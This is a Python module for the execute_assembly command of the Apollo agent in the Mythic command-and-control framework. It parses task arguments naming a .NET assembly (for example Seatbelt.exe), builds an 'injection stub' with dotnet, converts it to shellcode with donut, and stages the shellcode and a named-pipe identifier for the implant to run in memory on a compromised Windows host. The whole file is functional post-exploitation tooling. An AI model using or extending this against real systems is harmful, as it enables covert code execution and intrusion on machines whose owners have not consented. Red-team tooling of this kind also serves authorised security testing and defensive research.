from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
from uuid import uuid4
from mythic_container.MythicRPC import *
from os import path
import asyncio
import donut
import platform

if platform.system() == "Windows":
    EXEECUTE_ASSEMBLY_PATH = "C:\\Mythic\\Apollo\\srv\\ExecuteAssembly.exe"
else:
    EXEECUTE_ASSEMBLY_PATH = "/srv/ExecuteAssembly.exe"


class ExecuteAssemblyArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Assembly to execute (e.g., Seatbelt.exe).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, group_name="Default", ui_position=1
                    )
                ],
            ),
            CommandParameter(
                name="assembly_file",
                display_name="New Assembly",
                type=ParameterType.File,
                description="A new assembly to execute. After uploading once, you can just supply the assembly_name parameter",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, group_name="New Assembly", ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=2
                    ),
                ],
            ),
        ]

    async def get_files(
        self, inputMsg: PTRPCDynamicQueryFunctionMessage
    ) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        file_resp = await SendMythicRPCFileSearch(
            MythicRPCFileSearchMessage(
                CallbackID=inputMsg.Callback,
                LimitByCallback=False,
                Filename="",
            )
        )
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = file_resp.Error
            return fileResponse

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    ExecuteAssemblyCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly [Assembly.exe] [args]"
    description = "Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command or by supplying an assembly with the task."
    version = 3
    author = "@djhohnstein"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1547"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False,
        load_only=False,
        suggested_command=False,
        dependencies=["register_file"],
    )

    async def build_exeasm(self):
        try:
            global EXEECUTE_ASSEMBLY_PATH
            agent_build_path = tempfile.TemporaryDirectory()
            outputPath = "{}/ExecuteAssembly/bin/Release/ExecuteAssembly.exe".format(
                agent_build_path.name
            )
            # shutil to copy payload files over
            copy_tree(str(self.agent_code_path), agent_build_path.name)
            shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/ExecuteAssembly/ExecuteAssembly.csproj -o {}/ExecuteAssembly/bin/Release/ --verbosity quiet".format(
                agent_build_path.name, agent_build_path.name
            )
            proc = await asyncio.create_subprocess_shell(
                shell_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )
            stdout, stderr = await proc.communicate()
            if not path.exists(outputPath):
                raise Exception(
                    "Failed to build ExecuteAssembly.exe:\n{}".format(
                        stderr.decode() + "\n" + stdout.decode()
                    )
                )
            shutil.copy(outputPath, EXEECUTE_ASSEMBLY_PATH)
        except Exception as ex:
            raise Exception(ex)

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global EXEECUTE_ASSEMBLY_PATH
        originalGroupNameIsDefault = taskData.args.get_parameter_group_name() == "Default"
        if taskData.args.get_parameter_group_name() == "New Assembly":
            fileSearchResp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                TaskID=taskData.Task.ID,
                AgentFileID=taskData.args.get_arg("assembly_file")
            ))
            if not fileSearchResp.Success:
                raise Exception(f"Failed to find uploaded file: {fileSearchResp.Error}")
            if len(fileSearchResp.Files) == 0:
                raise Exception(f"Failed to find matching file, was it deleted?")

            taskData.args.add_arg("assembly_name", fileSearchResp.Files[0].Filename)
            if fileSearchResp.Files[0].AgentFileId in taskData.Task.OriginalParams:
                response.DisplayParams = f"-Assembly {fileSearchResp.Files[0].Filename} -Arguments {taskData.args.get_arg('assembly_arguments')}"
            taskData.args.remove_arg("assembly_file")
            taskData.args.add_arg("assembly_id", fileSearchResp.Files[0].AgentFileId)

        taskargs = taskData.args.get_arg("assembly_arguments")
        if originalGroupNameIsDefault:
            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                Filename=taskData.args.get_arg("assembly_name"),
                TaskID=taskData.Task.ID,
                MaxResults=1
            ))
            if not file_resp.Success:
                raise Exception(f"failed to find assembly: {file_resp.Error}")
            if len(file_resp.Files) == 0:
                raise Exception(f"no assembly by that name that's not deleted")
            else:
                taskData.args.add_arg("assembly_id", file_resp.Files[0].AgentFileId)
            if taskargs == "" or taskargs is None:
                response.DisplayParams = "-Assembly {}".format(
                    taskData.args.get_arg("assembly_name")
                )
            else:
                response.DisplayParams = "-Assembly {} -Arguments {}".format(
                    taskData.args.get_arg("assembly_name"), taskargs
                )
        taskData.args.add_arg("pipe_name", str(uuid4()))
        if not path.exists(EXEECUTE_ASSEMBLY_PATH):
            # create
            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                TaskID=taskData.Task.ID,
                UpdateStatus=f"building injection stub"
            ))
            await self.build_exeasm()
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=taskData.Task.ID,
            UpdateStatus=f"generating stub shellcode"
        ))
        donutPic = donut.create(
            file=EXEECUTE_ASSEMBLY_PATH, params=taskData.args.get_arg("pipe_name")
        )
        file_resp = await SendMythicRPCFileCreate(
            MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
            )
        )
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception(
                "Failed to register execute_assembly binary: " + file_resp.Error
            )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
